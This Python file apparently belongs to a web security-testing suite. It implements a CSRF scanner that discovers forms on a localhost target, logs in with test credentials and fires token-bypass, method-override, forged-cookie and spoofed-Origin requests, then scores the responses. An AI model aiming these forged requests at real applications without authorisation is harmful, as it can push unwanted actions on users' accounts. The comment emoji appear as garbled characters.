#!/usr/bin/env python3
"""
üê∫ Cross-Site Request Forgery (CSRF) Attacks

*snarls with predatory cunning* These exploits test for CSRF vulnerabilities
by crafting malicious requests that trick authenticated users into performing
unintended actions. We hunt for missing or weak CSRF protections!

Based on 2025 research showing CSRF remains prevalent despite awareness.
The pack coordinates state-changing request forgery, token bypass attempts,
and SameSite cookie manipulation to expose weak session protection!
"""

import asyncio
import aiohttp
import json
import re
from typing import List, Dict, Any, Optional, Set
import logging
from urllib.parse import urljoin, urlparse, parse_qs
from bs4 import BeautifulSoup
import uuid

# Configure logging
logging.basicConfig(level=logging.INFO)
logger = logging.getLogger(__name__)


class CSRFAttacker:
    """
    üê∫ *pack hunting formation* CSRF exploitation class that systematically
    hunts for Cross-Site Request Forgery vulnerabilities across web applications.
    """
    
    def __init__(self, target_url: str = "http://localhost:8000"):
        self.target_url = target_url.rstrip('/')
        self.session: Optional[aiohttp.ClientSession] = None
        self.discovered_forms: List[Dict[str, Any]] = []
        self.csrf_tokens: Set[str] = set()
        self.session_cookies: Dict[str, str] = {}
        
    async def __aenter__(self):
        self.session = aiohttp.ClientSession()
        return self
        
    async def __aexit__(self, exc_type, exc_val, exc_tb):
        if self.session:
            await self.session.close()
    
    async def discover_forms(self, path: str = '/') -> List[Dict[str, Any]]:
        """
        üê∫ *scouts territory* Discover forms and AJAX endpoints that might
        be vulnerable to CSRF attacks.
        """
        forms = []
        
        if not self.session:
            return forms
        
        try:
            async with self.session.get(
                urljoin(self.target_url, path),
                timeout=10
            ) as response:
                if response.status == 200 and 'text/html' in response.headers.get('content-type', ''):
                    html_content = await response.text()
                    soup = BeautifulSoup(html_content, 'html.parser')
                    
                    # Find all forms
                    html_forms = soup.find_all('form')
                    for form in html_forms:
                        form_data = {
                            'action': form.get('action', ''),
                            'method': form.get('method', 'GET').upper(),
                            'inputs': [],
                            'csrf_tokens': [],
                            'has_file_upload': False
                        }
                        
                        # Extract form inputs
                        inputs = form.find_all(['input', 'textarea', 'select'])
                        for input_elem in inputs:
                            input_data = {
                                'name': input_elem.get('name', ''),
                                'type': input_elem.get('type', 'text'),
                                'value': input_elem.get('value', ''),
                                'required': input_elem.has_attr('required')
                            }
                            form_data['inputs'].append(input_data)
                            
                            # Check for CSRF tokens
                            if input_data['type'] == 'hidden' and any(
                                token_name in input_data['name'].lower() 
                                for token_name in ['csrf', 'token', '_token', 'authenticity']
                            ):
                                form_data['csrf_tokens'].append({
                                    'name': input_data['name'],
                                    'value': input_data['value']
                                })
                                self.csrf_tokens.add(input_data['value'])
                            
                            # Check for file uploads
                            if input_data['type'] == 'file':
                                form_data['has_file_upload'] = True
                        
                        forms.append(form_data)
                    
                    # Look for AJAX endpoints in JavaScript
                    script_tags = soup.find_all('script')
                    for script in script_tags:
                        if script.string:
                            # Extract potential AJAX endpoints
                            ajax_patterns = [
                                r'fetch\(["\']([^"\']+)["\']',
                                r'\.post\(["\']([^"\']+)["\']',
                                r'\.get\(["\']([^"\']+)["\']',
                                r'\.put\(["\']([^"\']+)["\']',
                                r'\.delete\(["\']([^"\']+)["\']',
                                r'ajax.*url.*["\']([^"\']+)["\']'
                            ]
                            for pattern in ajax_patterns:
                                matches = re.findall(pattern, script.string, re.IGNORECASE)
                                for match in matches:
                                    if match.startswith('/api/') or match.startswith('/'):
                                        ajax_form = {
                                            'action': match,
                                            'method': 'POST',
                                            'inputs': [{'name': 'data', 'type': 'json', 'value': '{}'}],
                                            'csrf_tokens': [],
                                            'has_file_upload': False,
                                            'is_ajax': True
                                        }
                                        forms.append(ajax_form)
                    
        except Exception as e:
            logger.debug(f"Error discovering forms: {str(e)}")
        
        self.discovered_forms.extend(forms)
        logger.info(f"üê∫ Discovered {len(forms)} forms/endpoints")
        return forms
    
    def generate_csrf_payloads(self, form_data: Dict[str, Any]) -> List[Dict[str, Any]]:
        """
        üê∫ *crafts malicious requests* Generate CSRF attack payloads for a form,
        including token bypass attempts and parameter manipulation.
        """
        payloads = []
        
        # Base payload with original form data
        base_payload = {}
        for input_field in form_data['inputs']:
            if input_field['name'] and input_field['type'] != 'file':
                if input_field['type'] == 'json':
                    base_payload[input_field['name']] = '{"test": "csrf_attack"}'
                else:
                    base_payload[input_field['name']] = input_field.get('value', 'csrf_test_value')
        
        # Payload 1: No CSRF token (direct attack)
        no_token_payload = base_payload.copy()
        for token in form_data['csrf_tokens']:
            no_token_payload.pop(token['name'], None)
        
        payloads.append({
            'name': 'No CSRF Token',
            'data': no_token_payload,
            'description': 'Submit form without CSRF token'
        })
        
        # Payload 2: Empty CSRF token
        if form_data['csrf_tokens']:
            empty_token_payload = base_payload.copy()
            for token in form_data['csrf_tokens']:
                empty_token_payload[token['name']] = ''
            
            payloads.append({
                'name': 'Empty CSRF Token',
                'data': empty_token_payload,
                'description': 'Submit form with empty CSRF token'
            })
        
        # Payload 3: Invalid CSRF token
        if form_data['csrf_tokens']:
            invalid_token_payload = base_payload.copy()
            for token in form_data['csrf_tokens']:
                invalid_token_payload[token['name']] = 'invalid_csrf_token_' + str(uuid.uuid4())[:8]
            
            payloads.append({
                'name': 'Invalid CSRF Token',
                'data': invalid_token_payload,
                'description': 'Submit form with invalid CSRF token'
            })
        
        # Payload 4: Reused CSRF token (if we have previous tokens)
        if form_data['csrf_tokens'] and self.csrf_tokens:
            reused_token_payload = base_payload.copy()
            old_token = list(self.csrf_tokens)[0] if self.csrf_tokens else 'old_token'
            for token in form_data['csrf_tokens']:
                reused_token_payload[token['name']] = old_token
            
            payloads.append({
                'name': 'Reused CSRF Token',
                'data': reused_token_payload,
                'description': 'Submit form with previously used CSRF token'
            })
        
        # Payload 5: Token parameter manipulation
        if form_data['csrf_tokens']:
            manipulated_payload = base_payload.copy()
            for token in form_data['csrf_tokens']:
                # Try different parameter names
                original_name = token['name']
                manipulated_payload.pop(original_name, None)
                
                # Add with different case
                manipulated_payload[original_name.upper()] = token['value']
                
            payloads.append({
                'name': 'Token Parameter Case Change',
                'data': manipulated_payload,
                'description': 'Submit form with modified CSRF token parameter name'
            })
        
        # Payload 6: Method override
        if form_data['method'] == 'POST':
            method_override_payload = base_payload.copy()
            method_override_payload['_method'] = 'PUT'
            method_override_payload['_METHOD'] = 'DELETE'
            
            payloads.append({
                'name': 'Method Override',
                'data': method_override_payload,
                'description': 'Submit form with HTTP method override parameters'
            })
        
        # Payload 7: Double submit cookie bypass
        double_submit_payload = base_payload.copy()
        fake_csrf_token = str(uuid.uuid4())
        double_submit_payload['csrf_token'] = fake_csrf_token
        
        payloads.append({
            'name': 'Double Submit Cookie',
            'data': double_submit_payload,
            'description': 'Submit form with matching CSRF token in cookie and parameter',
            'custom_cookies': {'csrf_token': fake_csrf_token}
        })
        
        # Payload 8: Subdomain bypass
        subdomain_payload = base_payload.copy()
        payloads.append({
            'name': 'Subdomain Origin',
            'data': subdomain_payload,
            'description': 'Submit form from subdomain origin',
            'custom_headers': {'Origin': 'https://evil.example.com'}
        })
        
        return payloads
    
    async def test_csrf_vulnerability(self, form_data: Dict[str, Any], 
                                    payload: Dict[str, Any]) -> Dict[str, Any]:
        """
        üê∫ *silent attack* Test a single CSRF payload against a form endpoint.
        """
        if not self.session:
            return {'error': 'Session not initialized'}
        
        action_url = urljoin(self.target_url, form_data['action'])
        method = form_data['method']
        
        try:
            # Prepare headers
            headers = {
                'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36',
                'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
                'Accept-Language': 'en-US,en;q=0.5',
                'Accept-Encoding': 'gzip, deflate',
                'DNT': '1',
                'Connection': 'close',
                'Upgrade-Insecure-Requests': '1',
            }
            
            # Add custom headers from payload
            if 'custom_headers' in payload:
                headers.update(payload['custom_headers'])
            
            # Set referrer to simulate cross-origin request
            if 'Origin' not in headers:
                headers['Origin'] = 'https://evil-attacker.com'
                headers['Referer'] = 'https://evil-attacker.com/csrf-attack.html'
            
            # Prepare cookies
            cookies = self.session_cookies.copy()
            if 'custom_cookies' in payload:
                cookies.update(payload['custom_cookies'])
            
            # Make request based on method
            if method == 'GET':
                async with self.session.get(
                    action_url,
                    params=payload['data'],
                    headers=headers,
                    cookies=cookies,
                    timeout=10
                ) as response:
                    response_text = await response.text()
                    
            else:  # POST, PUT, DELETE, etc.
                if form_data.get('is_ajax', False):
                    headers['Content-Type'] = 'application/json'
                    headers['X-Requested-With'] = 'XMLHttpRequest'
                    data = json.dumps(payload['data'])
                else:
                    data = payload['data']
                
                async with self.session.request(
                    method,
                    action_url,
                    data=data,
                    headers=headers,
                    cookies=cookies,
                    timeout=10
                ) as response:
                    response_text = await response.text()
            
            # Analyze response for CSRF success indicators
            csrf_indicators = {
                'status_code': response.status,
                'response_length': len(response_text),
                'successful_action': False,
                'error_mentioned': False,
                'csrf_protection_active': False,
                'session_valid': False
            }
            
            response_lower = response_text.lower()
            
            # Check for successful action indicators
            success_indicators = [
                'success', 'updated', 'created', 'deleted', 'saved',
                'thank you', 'completed', 'processed', 'confirmed'
            ]
            csrf_indicators['successful_action'] = any(
                indicator in response_lower for indicator in success_indicators
            )
            
            # Check for CSRF protection indicators
            csrf_protection_indicators = [
                'csrf', 'token', 'invalid token', 'forbidden', 'unauthorized',
                'cross-site', 'security token', 'authenticity'
            ]
            csrf_indicators['csrf_protection_active'] = any(
                indicator in response_lower for indicator in csrf_protection_indicators
            )
            
            # Check for error indicators
            error_indicators = [
                'error', 'failed', 'invalid', 'denied', 'rejected', 'blocked'
            ]
            csrf_indicators['error_mentioned'] = any(
                indicator in response_lower for indicator in error_indicators
            )
            
            # Check if session is still valid
            csrf_indicators['session_valid'] = response.status != 401 and 'login' not in response_lower
            
            # Determine vulnerability
            vulnerable = (
                response.status in [200, 302] and  # Successful response
                csrf_indicators['successful_action'] and  # Action appears successful
                not csrf_indicators['csrf_protection_active']  # No CSRF protection mentioned
            )
            
            return {
                'payload_name': payload['name'],
                'vulnerable': vulnerable,
                'indicators': csrf_indicators,
                'response_preview': response_text[:200] if response_text else "",
                'description': payload['description']
            }
            
        except Exception as e:
            logger.debug(f"Error testing CSRF payload {payload['name']}: {str(e)}")
            return {
                'payload_name': payload['name'],
                'error': str(e),
                'vulnerable': False,
                'description': payload['description']
            }
    
    async def comprehensive_csrf_test(self, form_data: Dict[str, Any]) -> Dict[str, Any]:
        """
        üê∫ *coordinated pack attack* Run comprehensive CSRF testing on a form
        with multiple bypass techniques.
        """
        logger.info(f"üê∫ Testing CSRF on {form_data['action']} ({form_data['method']})")
        
        # Generate CSRF payloads
        payloads = self.generate_csrf_payloads(form_data)
        
        results = {
            'form': form_data,
            'total_tests': len(payloads),
            'vulnerable_payloads': [],
            'suspicious_responses': [],
            'protection_analysis': {
                'has_csrf_tokens': len(form_data['csrf_tokens']) > 0,
                'token_names': [token['name'] for token in form_data['csrf_tokens']],
                'bypass_attempts': 0,
                'successful_bypasses': 0
            }
        }
        
        # Test each payload
        for payload in payloads:
            test_result = await self.test_csrf_vulnerability(form_data, payload)
            results['protection_analysis']['bypass_attempts'] += 1
            
            if test_result.get('vulnerable', False):
                results['vulnerable_payloads'].append(test_result)
                results['protection_analysis']['successful_bypasses'] += 1
                logger.warning(f"üê∫ CSRF VULNERABILITY: {payload['name']} on {form_data['action']}")
            
            elif test_result.get('indicators', {}).get('successful_action', False):
                results['suspicious_responses'].append(test_result)
            
            # Small delay to avoid overwhelming the server
            await asyncio.sleep(0.1)
        
        return results
    
    async def establish_authenticated_session(self, login_endpoint: str = '/api/auth/login',
                                            username: str = 'test', password: str = 'test') -> bool:
        """
        üê∫ *infiltrates territory* Establish an authenticated session to test
        CSRF on protected endpoints.
        """
        if not self.session:
            return False
        
        try:
            # Try to login
            login_data = {
                'username': username,
                'email': username,
                'password': password
            }
            
            async with self.session.post(
                urljoin(self.target_url, login_endpoint),
                data=login_data,
                timeout=10
            ) as response:
                
                if response.status in [200, 302]:
                    # Store session cookies
                    for cookie in response.cookies:
                        self.session_cookies[cookie.key] = cookie.value
                    
                    logger.info(f"üê∫ Established authenticated session")
                    return True
                    
        except Exception as e:
            logger.debug(f"Failed to establish session: {str(e)}")
        
        return False
    
    async def run_full_csrf_assessment(self) -> Dict[str, Any]:
        """
        üê∫ *territory-wide hunt* Run full CSRF assessment across all discovered
        forms and endpoints.
        """
        logger.info("üê∫ Starting comprehensive CSRF assessment...")
        
        # Try to establish authenticated session
        await self.establish_authenticated_session()
        
        # Discover forms from common pages
        common_pages = ['/', '/login', '/register', '/profile', '/settings', '/admin']
        all_forms = []
        
        for page in common_pages:
            forms = await self.discover_forms(page)
            all_forms.extend(forms)
        
        # Remove duplicates
        unique_forms = []
        seen_actions = set()
        for form in all_forms:
            action_key = f"{form['method']}:{form['action']}"
            if action_key not in seen_actions:
                unique_forms.append(form)
                seen_actions.add(action_key)
        
        logger.info(f"üê∫ Testing {len(unique_forms)} unique forms for CSRF vulnerabilities")
        
        assessment_results = {
            'target_url': self.target_url,
            'forms_tested': len(unique_forms),
            'form_results': [],
            'overall_summary': {
                'total_vulnerabilities': 0,
                'vulnerable_forms': 0,
                'total_bypass_attempts': 0,
                'successful_bypasses': 0,
                'forms_with_protection': 0,
                'forms_without_protection': 0
            }
        }
        
        # Test each form
        for form in unique_forms:
            form_result = await self.comprehensive_csrf_test(form)
            assessment_results['form_results'].append(form_result)
            
            # Update overall summary
            if form_result['vulnerable_payloads']:
                assessment_results['overall_summary']['vulnerable_forms'] += 1
                assessment_results['overall_summary']['total_vulnerabilities'] += len(form_result['vulnerable_payloads'])
            
            assessment_results['overall_summary']['total_bypass_attempts'] += form_result['protection_analysis']['bypass_attempts']
            assessment_results['overall_summary']['successful_bypasses'] += form_result['protection_analysis']['successful_bypasses']
            
            if form_result['protection_analysis']['has_csrf_tokens']:
                assessment_results['overall_summary']['forms_with_protection'] += 1
            else:
                assessment_results['overall_summary']['forms_without_protection'] += 1
        
        logger.info(f"üê∫ CSRF assessment complete: "
                   f"{assessment_results['overall_summary']['total_vulnerabilities']} vulnerabilities found "
                   f"across {assessment_results['overall_summary']['vulnerable_forms']} forms")
        
        return assessment_results


async def main():
    """
    üê∫ *howls with pack coordination* Main hunting function for CSRF exploitation.
    """
    target_url = "http://localhost:8000"
    
    async with CSRFAttacker(target_url) as attacker:
        print("üê∫ Starting CSRF (Cross-Site Request Forgery) Assessment...")
        
        # Run full CSRF assessment
        results = await attacker.run_full_csrf_assessment()
        
        print(f"\nüê∫ CSRF ASSESSMENT RESULTS:")
        print(f"Forms tested: {results['forms_tested']}")
        print(f"Vulnerabilities found: {results['overall_summary']['total_vulnerabilities']}")
        print(f"Vulnerable forms: {results['overall_summary']['vulnerable_forms']}")
        print(f"Forms with CSRF protection: {results['overall_summary']['forms_with_protection']}")
        print(f"Forms without protection: {results['overall_summary']['forms_without_protection']}")
        print(f"Successful bypasses: {results['overall_summary']['successful_bypasses']}")
        
        # Show detailed results for vulnerable forms
        print(f"\nüê∫ VULNERABLE FORM DETAILS:")
        for form_result in results['form_results']:
            if form_result['vulnerable_payloads']:
                form = form_result['form']
                print(f"\nVulnerable: {form['method']} {form['action']}")
                print(f"  CSRF tokens present: {form_result['protection_analysis']['has_csrf_tokens']}")
                print(f"  Successful bypasses: {form_result['protection_analysis']['successful_bypasses']}")
                
                # Show successful bypass methods
                for vuln in form_result['vulnerable_payloads']:
                    print(f"    ‚úì {vuln['payload_name']}: {vuln['description']}")
                    if vuln.get('response_preview'):
                        print(f"      Response: {vuln['response_preview'][:100]}...")


if __name__ == "__main__":
    asyncio.run(main())
